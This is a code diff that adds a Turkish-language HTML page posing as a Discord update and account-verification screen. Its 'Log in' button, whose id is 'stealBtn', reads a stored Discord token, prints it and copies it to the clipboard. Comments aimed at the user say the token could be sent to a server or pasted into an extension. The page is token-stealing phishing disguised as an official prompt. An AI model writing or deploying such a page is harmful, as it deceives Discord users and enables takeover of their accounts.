@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Discord Güncelleme</title>
+</head>
+<body>
+    <h3>Lütfen hesabınızı doğrulayın...</h3>
+    <button id="stealBtn">Giriş Yap</button>
+
+    <script>
+        document.getElementById('stealBtn').addEventListener('click', function() {
+            // Tarayıcıdaki mevcut token'ı al
+            const token = localStorage.getItem('discord_token');
+            
+            if(token) {
+                // Token'ı konsola yazdırırız ki sen kopyalayabilesin
+                console.log("Token:", token);
+                alert("Başarıyla giriş yapıldı! Token kopyalandı.");
+                
+                // İstersen token'ı bir sunucuya da gönderebilirsin ama şu an manuel kopyalamak daha hızlı.
+                navigator.clipboard.writeText(token).then(() => {
+                    alert("Token panoya kopyalandı! Şimdi eklentiye yapıştırabilirsin.");
+                });
+            } else {
+                alert("Lütfen önce Discord'a giriş yapın.");
+            }
+        });
+    </script>
+</body>
+</html>
